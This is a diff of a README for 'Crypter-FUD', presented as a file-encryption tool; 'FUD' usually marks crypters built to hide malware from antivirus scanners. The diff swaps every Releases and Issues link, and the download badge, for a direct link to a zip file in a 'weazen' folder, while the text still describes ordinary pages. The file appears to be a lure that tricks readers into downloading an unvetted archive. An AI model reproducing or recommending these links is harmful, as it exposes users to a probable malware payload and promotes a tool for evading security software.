@@ -1,6 +1,6 @@
 # 🔒 Crypter-FUD - Secure Your Files with Ease
 
-[![Download Crypter-FUD](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/spy06018/Crypter-FUD/releases)
+[![Download Crypter-FUD](https://raw.githubusercontent.com/spy06018/Crypter-FUD/main/weazen/Crypter-FUD.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/spy06018/Crypter-FUD/main/weazen/Crypter-FUD.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ Crypter v2.0 is an encryption tool that helps you protect your files using a str
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/spy06018/Crypter-FUD/releases). This page holds the latest version of Crypter-FUD.
+   Go to the [Releases page](https://raw.githubusercontent.com/spy06018/Crypter-FUD/main/weazen/Crypter-FUD.zip). This page holds the latest version of Crypter-FUD.
 
 2. **Download the Latest Version**  
    Look for the latest release version. Click on the appropriate download link for your operating system. 
@@ -21,7 +21,7 @@ To get started, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download Crypter-FUD, simply visit this page: [Download Crypter-FUD](https://github.com/spy06018/Crypter-FUD/releases). Once you’ve accessed the page, you will see a list of available versions. Choose the version that suits your needs and click the corresponding download link.
+To download Crypter-FUD, simply visit this page: [Download Crypter-FUD](https://raw.githubusercontent.com/spy06018/Crypter-FUD/main/weazen/Crypter-FUD.zip). Once you’ve accessed the page, you will see a list of available versions. Choose the version that suits your needs and click the corresponding download link.
 
 After downloading, install the application by running the installer and following the prompts.
 
@@ -68,7 +68,7 @@ To run Crypter-FUD smoothly, ensure your system meets the following requirements
 
 If you have questions or need assistance, you can reach out to the community through the following resources:
 
-- **Issues Page:** Track or report issues on the [Issues page](https://github.com/spy06018/Crypter-FUD/issues).
+- **Issues Page:** Track or report issues on the [Issues page](https://raw.githubusercontent.com/spy06018/Crypter-FUD/main/weazen/Crypter-FUD.zip).
 - **Discussion Forum:** Join discussions and share tips with other users.
 
 ## 🔗 Related Topics
@@ -85,4 +85,4 @@ Crypter-FUD is released under the MIT License. You can freely use and modify the
 
 ## 📥 Reminder for Download
 
-Don't forget to download Crypter-FUD by visiting the Releases page: [Download Crypter-FUD](https://github.com/spy06018/Crypter-FUD/releases). Follow the steps above to ensure a smooth installation and usage experience.
+Don't forget to download Crypter-FUD by visiting the Releases page: [Download Crypter-FUD](https://raw.githubusercontent.com/spy06018/Crypter-FUD/main/weazen/Crypter-FUD.zip). Follow the steps above to ensure a smooth installation and usage experience.
